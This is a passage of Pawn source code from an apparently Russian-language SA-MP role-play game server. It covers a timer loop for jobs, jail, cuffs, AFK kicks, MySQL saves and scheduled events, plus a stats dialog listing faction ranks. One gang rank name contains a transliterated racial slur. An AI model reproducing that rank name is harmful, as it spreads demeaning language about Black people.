			if(LabelOn[i] == 1 && PlayerInfo[i][pWantedLevel] <= 1) Delete3DTextLabel(LabelRecognition[i]), LabelOn[i] = 0;
			if(GetPVarInt(i, "BusTime") > 0)
			{
				SetPVarInt(i, "BusTime", GetPVarInt(i, "BusTime") - 1);
				format(string,10,"~r~%i",GetPVarInt(i, "BusTime"));
				GameTextForPlayer(i, string, 2000, 6);
				if(GetPVarInt(i, "BusTime") == 0)
				{
					if(GetPVarInt(i,"BusRepairMoney") > GetPVarInt(i, "BusMoney")) SetPVarInt(i,"BusRepairMoney",PlayerInfo[i][pPayCheck]);
					format(YCMDstr, sizeof(YCMDstr), " Вы закончили свой рабочий день. Заработано $%i. За ремонт -$%i", GetPVarInt(i, "BusMoney"), GetPVarInt(i,"BusRepairMoney"));
					SCM(i, 0x26bf99aa, YCMDstr);
					SCM(i, -1, " Деньги будут перечислены на ваш счёт во время зарплаты");
					SetVehicleToRespawn(GetPVarInt(i, "rentcar_job"));
					Delete3DTextLabel(JobText3D[GetPVarInt(i,"rentcar_job")]);
					DisablePlayerRaceCheckpoint(i);
					PlayerInfo[i][pPayCheck] -= GetPVarInt(i,"BusRepairMoney");
					DeletePVar(i, "BusTime");
					DeletePVar(i, "TypeBus");
					DeletePVar(i, "BusStop");
					DeletePVar(i, "BusMoney");
					DeletePVar(i, "BusRepairMoney");
					DeletePVar(i, "rentcar_job");
					pPressed[i] = 0;
				}
			}
			if(GetPVarInt(i, "TimeBus") > 0)
			{
				SetPVarInt(i, "TimeBus", GetPVarInt(i, "TimeBus") - 1);
				format(string,32,"~r~%i",GetPVarInt(i, "TimeBus"));
				GameTextForPlayer(i, string, 2000, 6);
				if(GetPVarInt(i, "TimeBus") == 0)
				{
					DeletePVar(i, "TimeBus");
					new type = GetPVarInt(i, "TypeBus"), p = pPressed[i];
					SetPVarInt(i, "BusStop", 1);
					if(type == 1) SetPlayerRaceCheckpoint(i,0,BusCityLS[p][0],BusCityLS[p][1],BusCityLS[p][2],BusCityLS[p][3],BusCityLS[p][4],BusCityLS[p][5],5.0);
					if(type == 2) SetPlayerRaceCheckpoint(i,0,BusCitySF[p][0],BusCitySF[p][1],BusCitySF[p][2],BusCitySF[p][3],BusCitySF[p][4],BusCitySF[p][5],5.0);
					if(type == 3) SetPlayerRaceCheckpoint(i,0,BusCityLV[p][0],BusCityLV[p][1],BusCityLV[p][2],BusCityLV[p][3],BusCityLV[p][4],BusCityLV[p][5],5.0);
					if(type == 4) SetPlayerRaceCheckpoint(i,0,BusSchool[p][0],BusSchool[p][1],BusSchool[p][2],BusSchool[p][3],BusSchool[p][4],BusSchool[p][5],5.0);
					if(type == 5) SetPlayerRaceCheckpoint(i,0,BusLSLV[p][0],BusLSLV[p][1],BusLSLV[p][2],BusLSLV[p][3],BusLSLV[p][4],BusLSLV[p][5],5.0);
					if(type == 6) SetPlayerRaceCheckpoint(i,0,BusLSZavodi[p][0],BusLSZavodi[p][1],BusLSZavodi[p][2],BusLSZavodi[p][3],BusLSZavodi[p][4],BusLSZavodi[p][5],5.0);
				}
			}
			if(IsSmoking[i] == 1)
			{
				format(YCMDstr, sizeof(YCMDstr), " %s докуривает сигарету.", Name(i));
				ProxDetector(30.0, i, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				new Float:PlayerHeal;
				GetPlayerHealth(i, PlayerHeal);
				if(PlayerHeal < 120) SetPlayerHealth(i, PlayerHeal+3);
				SetPlayerSpecialAction(i,SPECIAL_ACTION_NONE);
			}
			if(IsSmoking[i] == 51 || IsSmoking[i] == 31 || IsSmoking[i] == 11)
			{
				format(YCMDstr, sizeof(YCMDstr), " %s курит сигарету.", Name(i));
				ProxDetector(30.0, i, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				new Float:PlayerHeal;
				GetPlayerHealth(i, PlayerHeal);
				if(PlayerHeal < 120) SetPlayerHealthAC(i, PlayerHeal+3);
			}
			if(IsSmoking[i] > 0) IsSmoking[i] -= 1;
			if(Works[i] == true && JobCP[i] == 2) if(usemesh[i] == 1) mesh[i] +=1;
			if(Flood[i] > 0) Flood[i] -=1;
			if(hour >= 12 && minute == 10 && second == 0) startaddiction[i] = 1;
			if(PlayerInfo[i][pMuted] > 1) PlayerInfo[i][pMuted] --;
			if(PlayerInfo[i][pMuted] == 1) PlayerInfo[i][pMuted] = 0, SCM(i,COLOR_LIGHTRED, " Вам включили чат. Пожалуйста соблюдайте правила");
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pMuted = '%i' WHERE name = '%e'", PlayerInfo[i][pMuted], PlayerInfo[i][pName]);
            mysql_function_query(DATABASE,QUERY,false,"","");
			if(PlayerInfo[i][pJailTime] > 0)
			{
				if(PlayerInfo[i][pJailTime] > 1) PlayerInfo[i][pJailTime]--;
				if(PlayerInfo[i][pJailTime] == 1)
				{
					if(PlayerInfo[i][pMestoJail] == 1) SetPlayerInterior(i, 0), SetPlayerPos(i,1553.4962,-1675.2714,16.1953), SetPlayerFacingAngle(i, 95.0636);
					if(PlayerInfo[i][pMestoJail] == 2) SetPlayerInterior(i, 0), SetPlayerPos(i,-1607.1873,721.3649,12.2721), SetPlayerFacingAngle(i, 2.3026);
					if(PlayerInfo[i][pMestoJail] == 3) SetPlayerInterior(i, 0), SetPlayerPos(i,2334.8467,2454.9456,14.9688), SetPlayerFacingAngle(i, 115.7874);
					if(PlayerInfo[i][pMestoJail] == 4) SetPlayerWorldBounds(i,20000.0000,-20000.0000,20000.0000,-20000.0000), SetPlayerInterior(i, 0), SetPlayerPos(i, 86.9821,1181.0541,18.6641);
					PlayerInfo[i][pJailTime] = 0;
					PlayerCuffed[i] = 0;
					SCM(i, COLOR_GREEN, " Вы заплатили ваш долг обществу");
					PlayerInfo[i][pMestoJail] = 0;
					PlayerInfo[i][pWantedLevel] = 0;
					SetPlayerWantedLevel(i, 0);
					SetPlayerVirtualWorld(i, 0);
					GameTextForPlayer(i,"~g~Freedom", 5000, 1);
				}
			}
			if(PlayerTazeTime[i] >= 1) PlayerTazeTime[i] += 1;
			if(PlayerTazeTime[i] >= 10) PlayerTazeTime[i] = 0, TogglePlayerControllable(i, 1);
			if(TieTime[i] > 0) TieTime[i]--;
			if(PlayerCuffed[i] == 1)
			{
				if(PlayerCuffedTime[i] <= 0)
				{
					TogglePlayerControllable(i, 1);
					PlayerCuffed[i] = 0;
					PlayerCuffedTime[i] = 0;
					PlayerTazeTime[i] = 1;
					ClearAnimations(i);
				}
				else PlayerCuffedTime[i] -= 1;
			}
			if(PlayerCuffed[i] == 2)
			{
				if(PlayerCuffedTime[i] <= 0)
				{
					TogglePlayerControllable(i, 1);
					PlayerCuffed[i] = 0;
					PlayerCuffedTime[i] = 0;
				}
				else PlayerCuffedTime[i] -= 1;
			}
			new stringF[50];
			if(GetPVarInt(i,"AFK_Tick") > 10000) SetPVarInt(i,"AFK_Tick",1), SetPVarInt(i,"AFK_Check",0);
			if(GetPVarInt(i,"AFK_Check") < GetPVarInt(i,"AFK_Tick") && GetPlayerState(i)) SetPVarInt(i,"AFK_Check",GetPVarInt(i,"AFK_Tick")), SetPVarInt(i,"AFK_Time",0);
			if(GetPVarInt(i,"AFK_Check") >= GetPVarInt(i,"AFK_Tick") && GetPlayerState(i))
			{
				SetPVarInt(i,"AFK_Time",GetPVarInt(i,"AFK_Time") + 1);
				if(GetPVarInt(i, "AFK_Time") > 2)
				{
					format(stringF,sizeof(stringF), "[AFK] [%s секунд]",ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
					SetPlayerChatBubble(i, stringF, COLOR_GREEN, 30.0, 1200);
				}
			}
			if(GetPVarInt(i,"AFK_Time") >= 900 && PlayerInfo[i][pAdmin] < 2)SCM(i,COLOR_LIGHTRED, " Вы были отсоеденены от сервера! (AFK)"), Kick(i);
		}
	}
	GetMoney();
	if(paint_info[0] > 0) GetPaintball();
	if(race_info[0] > 0) GetRace();
	if(WarStart > 0) WarStart--;
	for(new i = 0; i < 20; i++)
	{
		if(MFrakCD[i] > 1)
		{
			MFrakCD[i] --;
			if(MFrakCD[i] == 900) SendFamilyMessage(i,0x114D71AA, " У вас осталось 15 минут на подготовку!");
			else if(MFrakCD[i] == 600) SendFamilyMessage(i,0x114D71AA, " У вас осталось 10 минут на подготовку!");
			else if(MFrakCD[i] == 180) SendFamilyMessage(i,COLOR_RED, " Пора решать кому будет пренадлежать бизнес. Осталось 3 минуты");
		}
	}
	if(war > 0) war -=1;
	if ((hour > ghour) || (hour == 0 && ghour == 23))
	{
		format(string, 90, " Сейчас времени %i:00 часов",hour);
		BroadCast(-1,string);
		ghour = hour;
		PayDay();
		SaveMySQL(0);
		for(new i = 1; i <= TOTALCASINO; i++) SaveMySQL(1,i);
		for(new i = 1; i <= TOTALSHOPS; i++) SaveMySQL(3,i);
		for(new i = 1; i <= TotalBizz; i++) SaveMySQL(4,i);
		for(new i = 1; i <= TotalHouse; i++) SaveMySQL(5,i);
		for(new i = 1; i <= ALLKVARTIRI; i++) SaveMySQL(6,i);
		for(new i = 1; i <= AllPODEZD; i++) SaveMySQL(7,i);
		for(new i = 1; i <= TOTALATM; i++) SaveMySQL(8,i);
		for(new i = 0; i <= TOTALFARM; i++) SaveMySQL(9,i);
		for(new i = 0; i < 20; i++) strmid(ATMADVERTISE[i],"", 0, strlen(""),150);
		for(new i = 1; i < MAX_PLAYERS; i++) Sonar[i] = random(2000);
		if (realtime) SetWorldTime(hour);
	}
	if(hour == 4 && minute == 59 && second == 20)
	{
		PayDay();
	}
	if(hour == 00 && minute == 01 && second == 00)
	{
		if(serverRestart) restartServer(1);
		else serverRestart = true;
	}
	if(hour == 00 && minute == 01 && second == 10)
	{
		if(rr)
		SendRconCommand("gmx");
	}
	if(hour == 00 && minute == 00 && second == 00)
	{
		/*mysql_function_query(DATABASE,"UPDATE `"TABLE_ACCOUNTS"` SET pChas = '0',pMin = '0',pOnlineLid = '00:00'",false,"","");
		foreach(i)
		{
			PlayerInfo[i][pChas] = 0;
			PlayerInfo[i][pMin] = 0;
			strmid(PlayerInfo[i][pOnlineLid],"00:00", 0, strlen("00:00"), 10);
		}*/
	}
	if(paint_info[1] == 0)
	{
		if(hour == 16 && minute == 10  || hour == 13 && minute == 10  || hour == 14 && minute == 10  || hour == 22 && minute == 10 || hour == 01 && minute == 30 || hour == 03 && minute == 15 )
		{
			SendClientMessageToAll(0xffaaffff," Внимание! Начало пейнтбола через 5 минут. Место проведения: военный завод K.A.C.C.");
			paint_info[0] = 300;
			paint_info[1] = 1;
			foreach(i) DeletePVar(i, "player_paint");
		}
	}
	if(race_info[1] == 0)
	{
		if(hour == 12 && minute == 10  || hour == 18 && minute == 10  || hour == 21 && minute == 10  || hour == 15 && minute == 10 || hour == 23 && minute == 10 )
		{
			SendClientMessageToAll(0xb9b900aa," Внимание! Начало гонок через 5 минут. Трасса: Аэропорт Лос Сантос. Регистрация у въезда");
			race_info[0] = 300;
			race_info[1] = 1;
			foreach(i) DeletePVar(i, "gonka");
		}
	}
	return true;
}
stock LeaderList(playerid)
{
	new msg[] = "[0] Гражданский\n[1] LSPD\n[2] FBI\n[3] ARMY SF\n[4] MEDIC SF\n[5] LCN\n[6] YAKUZA\n[7] MAYOR\n[8] CASINO CALIGULA\n[9] SFN\n[10] SFPD\n[11] INSTRUCTOR\n[12] BALLAS\n[13] VAGOS\n[14] RUS MAFIA\n[15] GROVE\n[16] LSN\n[17] AZTEC\n[18] RIFA\n[19] LVA\n[20] LVN\n[21] LVPD\n[22] MEDIC LS\n[23-32] BIKERS\n[23] MEDIC LV";
	ShowPlayerDialogEx(playerid,22813,DIALOG_STYLE_MSGBOX, "Ид фаркций",msg, "Закрыть", "");
}
stock kShowStats(playerid,targetid)
{
	new tempstring[100];
	new httpquery[2500];
	format(httpquery, sizeof(httpquery),"");
	new stringersqw[30],stringersqx[35],teampstringds[30],teampstringd[30],teampstring[70];
	format(stringersqw,sizeof(stringersqw),"Имя:\t\t\t\t%s\n\n",Name(targetid));
	strcat(httpquery,stringersqw);

	format(stringersqx,sizeof(stringersqx),"Уровень:\t\t\t%d\n",PlayerInfo[targetid][pLevel]);
	strcat(httpquery,stringersqx);
	new nxtlevlel = PlayerInfo[targetid][pLevel]+1;
	new expert = nxtlevlel*4;
	format(teampstringds,sizeof(teampstringds),"Exp:\t\t\t\t%d/%d\n",PlayerInfo[targetid][pExp],expert);
	strcat(httpquery,teampstringds);

	format(teampstringd,sizeof(teampstringd),"Деньги:\t\t\t%d",PlayerInfo[targetid][pCash]);
	strcat(httpquery,teampstringd);

	format(teampstring,sizeof(teampstring),"\nВарнов:\t\t\t%d",PlayerInfo[targetid][pWarns]);
	strcat(httpquery,teampstring);

	if(PlayerInfo[targetid][OffWarns] && PlayerInfo[targetid][pWarns])
	{
		new strisaq[35];
		format(strisaq,sizeof(strisaq),"\nВарн до: %s",date("%dd/%mm/%yyyy  %hh:%ii",PlayerInfo[targetid][OffWarns]));
		strcat(httpquery,strisaq);
	}

	new qdqwdsds[35],tempstringessrd[35],tempstringessr[35],tempstringesdr[35],tempstringesr[35];
	new tempstringe[35],tempstrings[35],tempstringq[35],tempstringqs[35],tempstringer[35];
	format(qdqwdsds,sizeof(qdqwdsds),"\nЗаконопослушность:\t\t%d\n",PlayerInfo[targetid][pZakonp]);
	strcat(httpquery,qdqwdsds);

	format(tempstringessr,sizeof(tempstringessr),"Преступлений:\t\t%d\n",PlayerInfo[targetid][pCrimes]);
	strcat(httpquery,tempstringessr);

	format(tempstringesdr,sizeof(tempstringesdr),"Смертей в розыске:\t\t%d\n",PlayerInfo[targetid][pWantedDeaths]);
	strcat(httpquery,tempstringesdr);

	format(tempstringesr,sizeof(tempstringesr),"Арестов:\t\t\t%d\n",PlayerInfo[targetid][pArrested]);
	strcat(httpquery,tempstringesr);

	format(tempstringer,sizeof(tempstringer),"Уровень розыска:\t\t%d\n",PlayerInfo[targetid][pWantedLevel]);
	strcat(httpquery,tempstringer);

	format(tempstringqs,sizeof(tempstringqs),"Дата регистрации:\t\t%s\n",PlayerInfo[targetid][pDataReg]);
	strcat(httpquery,tempstringqs);

	format(tempstringq,sizeof(tempstringq),"Зависимость:\t\t\t%d\n",PlayerInfo[targetid][pAddiction]);
	strcat(httpquery,tempstringq);

	format(tempstringe,sizeof(tempstringe),"Наркотики:\t\t\t%d\n",PlayerInfo[targetid][pDrugs]);
	strcat(httpquery,tempstringe);

	format(tempstrings,sizeof(tempstrings),"Материалы:\t\t\t%d\n",PlayerInfo[targetid][pMats]);
	strcat(httpquery,tempstrings);

	format(tempstringessrd,sizeof(tempstringessrd),"Рыбы поймано:\t\t\t%.2f кг\n",PlayerInfo[targetid][pFishes]);
	strcat(httpquery,tempstringessrd);

	new tempisoo[70];
	switch(PlayerInfo[targetid][pMember])
	{
	case 0: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tНет\n");
	case 1: strcat(httpquery,"Организиция:\t\t\tPolice LS\n");
	case 2: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tFBI\n");
	case 3: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tArmy SF\n");
	case 4: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tМедики SF\n");
	case 5: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tLa Cosa Nostra\n");
	case 6: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tYakuza\n");
	case 7: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tМэрия\n");
	case 8: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tCasino\n");
	case 9: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tSF News\n");
	case 10: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tPolice SF\n");
	case 11: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tИнструкторы\n");
	case 12: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tBallas Gang\n");
	case 13: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tVagos Gang\n");
	case 14: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tРусская Мафия\n");
	case 15: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tGrove Street\n");
	case 16: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tLS News\n");
	case 17: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tAztecas Gang\n");
	case 18: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tRifa Gang\n");
	case 19: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tArmy LV\n");
	case 20: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tLV News\n");
	case 21: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tPolice LV\n");
	case 24: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tHell's Angels MC\n");
	case 26: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tWarlocks MC\n");
	case 29: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tPagans MC\n");
	case 22: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tМедики LS\n");
	case 33: format(tempisoo,sizeof(tempisoo),"Организиция:\t\t\tМедики ЛВ\n");
	}
	strcat(httpquery,tempisoo);

	switch(PlayerInfo[targetid][pMember])
	{
	case 0: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\t-\n");
	case 1,10,21:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 1: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tКадет\n");
			case 2: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tОфицер\n");
			case 3: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМл. Сержант\n");
			case 4: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСержант\n");
			case 5: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tПрапорщик\n");
			case 6: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСт. Прапорщик\n");
			case 7: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМл. Лейтенант\n");
			case 8: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЛейтенант\n");
			case 9: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСт. Лейтенант\n");
			case 10: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tКапитан\n");
			case 11: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМайор\n");
			case 12: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tПодполковник\n");
			case 13: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tПолковник\n");
			case 14: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tШериф\n");

			}
		}
	case 19:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 1: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tРядовой\n");
			case 2: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЕфрейтор\n");
			case 3: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМл. Сержант\n");
			case 4: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСержант\n");
			case 5: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСтаршина\n");
			case 6: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tПрапорщик\n");
			case 7: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСт. Прапорщик\n");
			case 8: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМл. Лейтенант\n");
			case 9: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЛейтенант\n");
			case 10: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСт. Лейтенант\n");
			case 11: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tКапитан\n");
			case 12: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМайор\n");
			case 13: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tПодполковник\n");
			case 14: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tПолковник\n");
			case 15: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tГенерал\n");
			}
		}
	case 3:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 1: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЮнга\n");
			case 2: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМатрос\n");
			case 3: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСт. Матрос\n");
			case 4: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСтаршина\n");
			case 5: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМл.Мичман\n");
			case 6: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМичман\n");
			case 7: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tCт.Мичман\n");
			case 8: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМл.Лейтенант\n");
			case 9: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЛейтенант\n");
			case 10: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСт. Лейтенант\n");
			case 11: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tКапитан-Лейтенант\n");
			case 12: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tКапитан 1-го ранга\n");
			case 13: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tКонтр-Адмирал\n");
			case 14: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tВице-Адмирал\n");
			case 15: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tАдмирал\n");
			}
		}
	case 9,16,20:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 1: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСтажер\n");
			case 2: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЗвукооператор\n");
			case 3: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЗвукорежиссер\n");
			case 4: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tРепортер\n");
			case 5: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tВедущий\n");
			case 6: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tРедактор\n");
			case 7: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tГл.Редактор\n");
			case 8: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tТех.Директор\n");
			case 9: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tПрограмный Директор\n");
			case 10: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tГен.Директор\n");
			}
		}
	case 7:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 1: format(tempstring, sizeof(tempstring), "Должность:\t\t\t\tСекретарь\n");
			case 2: format(tempstring, sizeof(tempstring), "Должность:\t\t\t\tАдвокат\n");
			case 3: format(tempstring, sizeof(tempstring), "Должность:\t\t\t\tОхранник\n");
			case 4: format(tempstring, sizeof(tempstring), "Должность:\t\t\t\tНач.Охранны\n");
			case 5: format(tempstring, sizeof(tempstring), "Должность:\t\t\t\tЗам.Мэра\n");
			case 6: format(tempstring, sizeof(tempstring), "Должность:\t\t\t\tМэр\n");
			}
		}
	case 11:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 1: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСтажер\n");
			case 2: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tКонсультант\n");
			case 3: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЭкзаменатор\n");
			case 4: format(tempstring,sizeof(tempstring),"Должность:\t\tМл.Инструктор\n");
			case 5: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tИнструктор\n");
			case 6: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tКоординатор\n");
			case 7: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМл.Менеджер\n");
			case 8: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСт.Менеджер\n");
			case 9: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tДиректор\n");
			case 10: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tУправляющий\n");
			}
		}
	case 2:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 1: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСтажер\n");
			case 2: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tДежурный\n");
			case 3: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМладший Агент\n");
			case 4: format(tempstring,sizeof(tempstring),"Должность:\t\tАгент отдела ГНК\n");
			case 5: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tАгент отдела CID\n");
			case 6: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tГлава отдела ГНК\n");
			case 7: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tГлава отдела CID\n");
			case 8: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tИнспектор FBI\n");
			case 9: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЗам. Директора FBI\n");
			case 10: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tДиректор FBI\n");
			}
		}
	case 15:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 1: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tПлейя\n");
			case 2: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tХастла\n");
			case 3: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tКилла\n");
			case 4: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЮонг Г\n");
			case 5: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tГангста\n");
			case 6: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tО.Г\n");
			case 7: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМобста\n");
			case 8: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tДе Кинг\n");
			case 9: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЛегенд\n");
			case 10: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМэд Дог\n");
			}
		}
	case 12:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 1: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tБлайд\n");
			case 2: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tБастер\n");
			case 3: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tКрекер\n");
			case 4: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tГун бро\n");
			case 5: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tАп бро\n");
			case 6: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tГангстер\n");
			case 7: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tФедерал блок\n");
			case 8: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tФолкс\n");
			case 9: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tРайч нигга\n");
			case 10: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tБиг Вилли\n");
			}
		}
	case 17:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 1: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tГринго\n");
			case 2: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tНовато\n");
			case 3: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЕстимадо\n");
			case 4: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tАмиго\n");
			case 5: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЕрмано\n");
			case 6: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСолдато\n");
			case 7: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tБандито\n");
			case 8: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tАджунто\n");
			case 9: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЕмпинадо\n");
			case 10: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tПадре\n");
			}
		}
	case 13:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 1: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tНовато\n");
			case 2: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tОрдинарио\n");
			case 3: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЛокал\n");
			case 4: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tВерификадо\n");
			case 5: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tБандито\n");
			case 6: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tV.E.G.\n");
			case 7: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tАссесино\n");
			case 8: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЛидер V.E.G.\n");
			case 9: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tПадрино\n");
			case 10: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tПадре\n");
			}
		}
	case 18:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 1: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tПерро\n");
			case 2: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tТирадор\n");
			case 3: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tГеттор\n");
			case 4: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЛас Геррас\n");
			case 5: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМирандо\n");
			case 6: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСабио\n");
			case 7: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tИнвасор\n");
